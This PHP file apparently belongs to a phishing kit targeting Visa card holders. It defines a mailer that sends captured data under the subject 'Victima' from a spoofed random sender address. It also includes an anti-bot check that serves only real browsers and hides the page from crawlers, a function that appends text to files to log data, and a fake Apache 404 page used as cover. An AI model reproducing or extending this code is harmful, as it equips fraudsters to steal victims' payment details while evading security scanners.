<?php
function find_text($text, $in){
$k2HjS9_09 = explode($text, $in);
$k2HjS9_08 = $k2HjS9_09[1];

if($k2HjS9_08 != ''){
return 1;
} else {
return 0;
}

}

class visa {
 function send_mail($mail, $content){

$asunto = "Victima";
$aleatory = sha1(microtime());
$desde = "From:Victima - New<$aleatory@worldbest.com>";

mail($mail,$asunto,$content,$desde);	
}

 function anti_bot($level){
 $agent = $_SERVER['HTTP_USER_AGENT'];
 if(empty($agent)){
 return 0;	
 } else {
 if(find_text('Bot', $agent) == 1 or find_text('BOT', $agent) == 1 ){
 return 0;	
 } else if (find_text('Chrome', $agent) == 1){
 return 1;	
 } else if (find_text('Opera', $agent) == 1){
 return 1;	
 } else if (find_text('Firefox', $agent) == 1){
 return 1;	
 } else {
 return 0;	
 }
 }	
 }

 function ks4v3($t3x1, $f1l3){
 
 $kOpD3ZelQ = fopen(''.$f1l3.'','a+');
 $zPpD3ZelQ = fwrite($kOpD3ZelQ, $t3x1);
 fclose($kOpD3ZelQ);	
 }
 
 function s404($say){
 if($say != ''){
 echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.23 Server at Port 80</address>
</body></html>';
 } else {
 return '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.23 Server at Port 80</address>
</body></html>';	
 }
}


}

?>